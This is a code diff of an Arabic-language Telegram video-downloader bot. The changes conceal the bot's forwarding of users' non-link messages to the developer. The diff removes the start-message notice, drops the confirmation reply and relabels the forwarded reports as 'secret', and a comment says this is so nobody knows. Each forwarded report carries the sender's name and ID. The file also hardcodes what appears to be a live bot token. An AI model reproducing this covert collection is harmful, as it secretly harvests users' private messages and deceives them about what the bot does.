@@ -5,15 +5,14 @@ from telegram.ext import Application, CommandHandler, MessageHandler, filters, C
 
 # --- الإعدادات الأساسية ---
 TOKEN = "8471320360:AAHrI1iS4e4RNxs3AVUvplh1cA1pfI0XcsI"
-# الأيدي مالتك الجديد من الصورة 1404
 ADMIN_ID = 1420457711 
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_name = update.effective_user.first_name
+    # تم تعديل الرسالة هنا حتى ما حد يدري
     await update.message.reply_text(
         f"هلا {user_name}! وياك 'علي' غول التحميل 🚀\n\n"
-        "دزلي رابط وراح أدزلك الفيديو وبصمة الصوت مالته سوا 🎤📹\n"
-        "وإذا كتبت أي شي ثاني، راح يوصلني كرسالة مباشرة! 😉"
+        "دزلي رابط (فيس، يوتيوب، تيك توك، إنستا) وراح أدزلك الفيديو وبصمة الصوت مالته سوا 🎤📹"
     )
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -39,11 +38,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 title = info.get('title', 'فيديو بدون عنوان')
                 artist = info.get('artist', info.get('uploader', 'مجهول'))
 
-            # إرسال الفيديو
             with open(filename, 'rb') as f:
                 await context.bot.send_video(chat_id=update.message.chat_id, video=f, caption=f"✅ {title}")
             
-            # إرسال البصمة (فويز)
             with open(filename, 'rb') as f:
                 await context.bot.send_voice(chat_id=update.message.chat_id, voice=f, caption=f"🎤 بصمة: {artist}")
             
@@ -52,17 +49,17 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             await update.message.reply_text("❌ صار خطأ.. تأكد من الرابط!")
 
-    # 2. إذا كانت الرسالة كلام عادي (توصيل للمطور)
+    # 2. إذا كانت الرسالة كلام عادي (توصيل سري للمطور)
     else:
-        await update.message.reply_text("وصلت رسالتك لعلي، راح يشوفها ويرد عليك! 🫡")
+        # مسحنا الرد على المستخدم هنا.. البوت راح يسكت وما يجاوبه شي
         
         report = (
-            f"📩 **رسالة جديدة من مستخدم:**\n\n"
+            f"📩 **رسالة سرية جديدة:**\n\n"
             f"👤 الأسم: {user.first_name}\n"
             f"🆔 الايدي: `{user.id}`\n"
             f"💬 الرسالة: {text}"
         )
-        # هنا البوت راح يدز الرسالة للأيدي مالتك (1420457711)
+        # الرسالة توصلك إلك بس
         await context.bot.send_message(chat_id=ADMIN_ID, text=report, parse_mode='Markdown')
 
 if __name__ == '__main__':
